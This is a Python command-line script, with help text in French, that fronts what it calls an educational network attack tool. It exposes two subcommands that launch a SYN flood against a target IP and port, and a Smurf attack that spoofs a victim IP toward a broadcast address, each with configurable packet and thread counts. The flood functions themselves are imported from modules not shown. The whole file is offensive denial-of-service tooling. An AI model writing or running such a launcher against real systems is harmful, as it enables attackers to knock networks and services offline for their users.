# cli.py

import argparse
from syn_flood import run_syn_flood
from smurf import run_smurf_attack
from colorama import Fore, Style

def main():
    parser = argparse.ArgumentParser(
        description=f"{Fore.BLUE}Outil d'attaque réseau éducatif - Choisissez une attaque à lancer{Style.RESET_ALL}",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )

    subparsers = parser.add_subparsers(dest="attack", required=True, help="Type d'attaque à lancer")

    # ---- SYN Flood ----
    syn_parser = subparsers.add_parser("syn", help="Lancer une attaque SYN Flood")
    syn_parser.add_argument("target_ip", help="Adresse IP de la cible")
    syn_parser.add_argument("target_port", type=int, help="Port TCP cible")
    syn_parser.add_argument("packet_count", type=int, help="Nombre de paquets SYN à envoyer par thread")
    syn_parser.add_argument("thread_count", type=int, help="Nombre de threads à utiliser")

    # ---- Smurf ----
    smurf_parser = subparsers.add_parser("smurf", help="Lancer une attaque Smurf")
    smurf_parser.add_argument("victim_ip", help="Adresse IP de la victime (spoofée)")
    smurf_parser.add_argument("broadcast_ip", help="Adresse de broadcast du réseau")
    smurf_parser.add_argument("packet_count", type=int, help="Nombre de paquets ICMP par thread")
    smurf_parser.add_argument("thread_count", type=int, help="Nombre de threads à utiliser")

    args = parser.parse_args()

    try:
        if args.attack == "syn":
            run_syn_flood(args.target_ip, args.target_port, args.packet_count, args.thread_count)
        elif args.attack == "smurf":
            run_smurf_attack(args.victim_ip, args.broadcast_ip, args.packet_count, args.thread_count)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Attaque interrompue par l'utilisateur")
    except Exception as e:
        print(f"{Fore.RED}[!] Erreur : {e}")

if __name__ == "__main__":
    main()
